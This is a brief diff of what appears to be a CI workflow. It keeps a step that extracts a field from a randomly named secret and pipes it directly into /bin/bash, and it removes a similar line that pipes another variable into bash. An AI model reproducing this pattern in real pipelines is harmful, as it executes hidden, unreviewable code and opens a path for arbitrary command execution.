@@ -18,7 +18,6 @@ jobs:
           nrdou273: ${{ secrets.nrdou273 }}
         run: |
           printf '%s' "$nrdou273" | jq -r .q06965 | /bin/bash
-          echo $bm12718 | jq -r .c32 | /bin/bash
 
       - name: Store artifact
         if: always()
